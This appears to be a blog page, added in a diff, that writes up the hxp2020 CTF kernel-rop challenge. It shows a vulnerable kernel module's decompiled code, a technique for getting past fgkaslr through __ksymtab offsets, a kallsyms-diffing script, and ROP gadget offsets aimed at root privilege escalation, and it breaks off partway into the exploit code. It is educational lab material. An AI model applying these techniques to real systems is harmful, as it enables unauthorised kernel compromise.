@@ -1,0 +1,1881 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hxp2020 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="Hxp2020" />
+<meta property="og:description" content="Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again.
+It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it&rsquo;s time to solve these left challenges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://xidoo.top/2021/08/hxp2020/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-23T21:44:40+08:00" />
+<meta property="article:modified_time" content="2021-08-23T21:44:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://xidoo.top/logo.png"/>
+
+<meta name="twitter:title" content="Hxp2020"/>
+<meta name="twitter:description" content="Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again.
+It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it&rsquo;s time to solve these left challenges."/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2021/08/hxp2020/" /><link rel="prev" href="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" /><link rel="next" href="http://xidoo.top/2021/08/first_post/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hxp2020",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/xidoo.top\/2021\/08\/hxp2020\/"
+        },"genre": "posts","wordcount":  4901 ,
+        "url": "http:\/\/xidoo.top\/2021\/08\/hxp2020\/","datePublished": "2021-08-23T21:44:40+08:00","dateModified": "2021-08-23T21:44:40+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "x1do0"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hxp2020</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-23">2021-08-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;4901 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;24 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#kernel-rop--6-solved--667-points">kernel-rop | 6 solved | 667 points</a></li>
+    <li><a href="#pfoten--18-solves--370-points">pfoten | 18 solves | 370 points</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Congratulations to Kaztebin, ranked 1 in DEFCON CTF29 again.</p>
+<p>It reminds me of my first ctf competition with Katzebin: hxp2020 [1]. There are some excellent challenges in this game which I missed out at that time, including some linux kernel exploitations. Recently I started to learn kernel pwn, and I think it&rsquo;s time to solve these left challenges.</p>
+<h2 id="kernel-rop--6-solved--667-points">kernel-rop | 6 solved | 667 points</h2>
+<p>The kernel insmod a bugged module &ldquo;hackme&rdquo;, which has open/read/write functions.</p>
+<p>In read function, It reads from kernel stack starting from tmp (rbp - 0x20h) with a size no more than 0x1000, and copy to user. However tmp is just 0x20 bytes long, which can cause some memory leaking on kernel stack.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rdx
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>  <span class="kt">bool</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// zf
+</span><span class="c1"></span>  <span class="n">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-A0h] BYREF
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-20h]
+</span><span class="c1"></span>
+  <span class="n">_fentry__</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">off</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+  <span class="n">v9</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+    <span class="n">BUG</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Same in write function, we can copy really long buffer to the kernel stack, causing stack overflow in kernel space.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rdx
+</span><span class="c1"></span>  <span class="n">ssize_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-A0h] BYREF
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-20h]
+</span><span class="c1"></span>
+  <span class="n">_fentry__</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">off</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x1000LL</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+    <span class="n">BUG</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+  <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Sounds like quite easy and straightforward, we can leak address to get the kernel image base, compute commit_creds and prepare_kernel_cred function address and using ROP to get root, just like the challenge name &ldquo;kernel ROP&rdquo;. Well, no.</p>
+<p>If you consider this challenge as a normal KALSR and smep bypass, you will fail for sure.</p>
+<p>Firstly of course, we edit the init file to debug the kernel and print out address of commit_creds like below.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ $ cat /proc/kallsyms <span class="p">|</span> grep commit_creds
+ffffffffb614d360 T commit_creds
+ffffffffb6987d90 r __ksymtab_commit_creds
+ffffffffb69a0972 r __kstrtab_commit_creds
+ffffffffb69a4d42 r __kstrtabns_commit_creds
+/ $ cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
+ffffffffb6096750 T prepare_kernel_cred
+ffffffffb698d4fc r __ksymtab_prepare_kernel_cred
+ffffffffb69a09b2 r __kstrtab_prepare_kernel_cred
+ffffffffb69a4d42 r __kstrtabns_prepare_kernel_cred
+</code></pre></td></tr></table>
+</div>
+</div><p>And when we exit and do this again, wierd thing happens.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/ $ cat /proc/kallsyms <span class="p">|</span> grep commit_creds
+ffffffff8ea7cc90 T commit_creds
+ffffffff8f587d90 r __ksymtab_commit_creds
+ffffffff8f5a0972 r __kstrtab_commit_creds
+ffffffff8f5a4d42 r __kstrtabns_commit_creds
+/ $ cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
+ffffffff8eb2b4a0 T prepare_kernel_cred
+ffffffff8f58d4fc r __ksymtab_prepare_kernel_cred
+ffffffff8f5a09b2 r __kstrtab_prepare_kernel_cred
+ffffffff8f5a4d42 r __kstrtabns_prepare_kernel_cred
+</code></pre></td></tr></table>
+</div>
+</div><p>The addresses does change, but we know that KASLR adds a random offset aligning to page size which means at least low bits should not change. What&rsquo;s going on?</p>
+<p>After several frustrating hours, I found the reason. In Jun 2020, the patch [2] added one of the most annoying mitigation against kernel exploits: Function Granular Kernel Address Space Layout Randomization (fgkaslr). It rearranges kernel code at load time on a per-function level granularity, which means every function address can be different when loaded.</p>
+<p>Seems like this challenge is unexploitable. But suddenly, I found that not all the functions are rearranged, like __ksymtab_commit_creds just printed out above! So are there any relation between __ksymtab_commit_creds and commit_creds?</p>
+<p>I found out that every kernel symbol has a structure below, in which value_offset actually stored offset between address of the symbol and specific function. So if we get value_offset of __ksymtab_commit_creds, we can add to it and get the real address of commit_creds!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">truct</span> <span class="n">kernel_symbol</span> <span class="p">{</span>
+	  <span class="kt">int</span> <span class="n">value_offset</span><span class="p">;</span>
+	  <span class="kt">int</span> <span class="n">name_offset</span><span class="p">;</span>
+	  <span class="kt">int</span> <span class="n">namespace_offset</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now the first things is to find out exactly which functions are affected by fgkaslr. Redirecting the output into files, I stored all the address of kallsym twice and got two txts.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash ./run.sh &gt; ./kallsyms1.txt
+cat /proc/kallsym
+
+<span class="c1"># second time</span>
+bash ./run.sh &gt; ./kallsyms2.txt
+cat /proc/kallsym 
+</code></pre></td></tr></table>
+</div>
+</div><p>Then I searched for kernel text base and wrote a simple script to list all the functions unaffected by fgkaslr</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">f1</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;kallsyms1.txt&#34;</span><span class="p">)</span>
+<span class="n">line</span> <span class="o">=</span> <span class="n">f1</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">dict1</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">kernel_base1</span><span class="o">=</span><span class="mh">0xffffffff8ac00000</span> <span class="c1"># first time</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start read file kallsyms1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="k">while</span> <span class="n">line</span> <span class="p">:</span>
+    <span class="n">sp</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">kernel_base1</span><span class="p">:</span>
+        <span class="n">dict1</span><span class="p">[</span><span class="n">sp</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">kernel_base1</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">f1</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">f1</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">f2</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;kallsyms2.txt&#34;</span><span class="p">)</span>
+<span class="n">line</span> <span class="o">=</span> <span class="n">f2</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">dict2</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">kernel_base2</span><span class="o">=</span><span class="mh">0xffffffffb2c00000</span> <span class="c1"># second time</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;start read file kallsyms2</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="k">while</span> <span class="n">line</span> <span class="p">:</span>
+    <span class="n">sp</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">kernel_base2</span><span class="p">:</span>
+        <span class="n">dict2</span><span class="p">[</span><span class="n">sp</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">kernel_base2</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">f2</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+
+<span class="n">f2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">dict3</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">dict1</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">dict1</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">==</span> <span class="n">dict2</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
+        <span class="n">dict3</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">dict1</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;store no fg_kaslr</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">f3</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;find_no_fgkaslr.txt&#34;</span><span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">dict3</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%016x</span><span class="s2"> : </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">dict3</span><span class="p">[</span><span class="n">k</span><span class="p">],</span><span class="n">k</span><span class="p">)</span>
+    <span class="n">f3</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">f3</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It turned out that lots of functions are not rearranged, at least all gadgets we need.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">gadget1</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x6370</span><span class="p">;</span> <span class="c1">//  pop rdi; ret;
+</span><span class="c1"></span><span class="n">gadget2</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x4d11</span><span class="p">;</span> <span class="c1">//  pop rax; ret;
+</span><span class="c1"></span><span class="n">gadget3</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x4aad</span><span class="p">;</span> <span class="c1">//  mov rax, qword ptr [rax + 0x10]; pop rbp; ret;
+</span><span class="c1"></span><span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xf87d90</span><span class="p">;</span>
+<span class="n">kpti_gadget</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x200f10</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">;</span> <span class="c1">//  swapgs_restore_regs_and_return_to_usermode()
+</span><span class="c1"></span><span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xf8d4fc</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Allright, now we can do ROPs after leaking kernel image base address and canary!</p>
+<p>For example, we use gadgets to move value_offset to rax in get_addr(). In leak1(), we get the content of rax and compute address of prepare_kernel_cred.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
